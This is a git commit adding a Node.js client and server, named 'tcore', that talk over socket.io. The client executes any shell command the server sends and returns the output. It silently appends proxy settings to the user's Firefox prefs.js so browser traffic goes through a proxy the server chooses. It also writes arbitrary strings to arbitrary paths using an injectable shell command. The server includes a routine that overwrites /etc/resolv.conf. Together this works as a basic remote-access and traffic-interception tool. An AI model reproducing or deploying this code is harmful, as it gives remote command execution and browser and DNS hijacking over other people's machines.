adc8e5bca102fca6fc24b7eee79cc9ac36b30345
Royston Lobo <roydl.net@gmail.com>
2017-10-12 08:31:55 +0530

    tcore

---
+++ tcore/client.js
@@ -0,0 +1,42 @@
+var exec = require('child_process').exec;
+var io = require('socket.io-client');
+var socket = io.connect('http://localhost:8000', {reconnect: true});
+var fs = require('fs'); 
+
+// Add a connect listener
+socket.on('connect', function (data) {
+    console.log('Connected!');
+    //socket.emit('connect', 'me');
+});
+
+socket.on('cmd', function (data, cb) {
+    exec(data.cmd, (err, stdout, stderr) => {
+        cb(stdout);
+    });
+});
+
+socket.on('setFFProxy', function(data) {
+
+        exec("ls ~/.mozilla/firefox/ | grep .default", (err, stdout, stderr) => {
+                var prefDirectory = stdout.trim();
+
+                fs.writeFile('temp.txt', data, function (err) {
+                    if (err) throw err;
+
+                    exec("cat temp.txt >> ~/.mozilla/firefox/" + prefDirectory + "/prefs.js", (err, stdout, stderr) => {
+                        console.log(err);
+                        console.log(stdout);
+                        console.log(stderr);
+                    });
+                }); 
+        });
+});
+
+
+socket.on('cmdWriteFile', function(data) {
+    exec("echo \"" + data.string + "\" > " + data.dest, (err, stdout, stderr) => {
+        console.log(err);
+        console.log(stdout);
+        console.log(stderr);
+    });
+});
---
+++ tcore/server.js
@@ -0,0 +1,57 @@
+var app = require('express')();
+var server = require('http').Server(app);
+var io = require('socket.io')(server);
+
+server.listen(8000);
+
+app.get('/', function (req, res) {
+  res.sendfile(__dirname + '/index.html');
+});
+
+io.on('connection', function (socket) {
+    
+  socket.emit('cmd', { cmd: 'ls' }, (response) => {
+    console.log("response " + response);
+  });
+
+  socket.emit('setFFProxy', generateFFProxySettings("localhost", 9333));
+
+  socket.on('CH01', function (data) {
+    console.log(data);
+  });
+
+  
+
+});
+
+
+
+function writeResolveCache() {
+    socket.emit('cmdWriteFile', {
+        string: "nameserver 127.0.0.1",
+        dest: '/etc/resolv.conf'
+    });
+}
+
+
+function generateFFProxySettings(ip, port) {
+  var proxySettings =
+`user_pref("network.proxy.backup.ftp", "${ip}");
+user_pref("network.proxy.backup.ftp_port", ${port});
+user_pref("network.proxy.backup.socks", "${ip}");
+user_pref("network.proxy.backup.socks_port", ${port});
+user_pref("network.proxy.backup.ssl", "${ip}");
+user_pref("network.proxy.backup.ssl_port", ${port});
+user_pref("network.proxy.ftp", "${ip}");
+user_pref("network.proxy.ftp_port", ${port});
+user_pref("network.proxy.http", "${ip}");
+user_pref("network.proxy.http_port", ${port});
+user_pref("network.proxy.share_proxy_settings", true);
+user_pref("network.proxy.socks", "${ip}");
+user_pref("network.proxy.socks_port", ${port});
+user_pref("network.proxy.ssl", "${ip}");
+user_pref("network.proxy.ssl_port", ${port});
+user_pref("network.proxy.type", 1);
+`;
+  return proxySettings;
+}
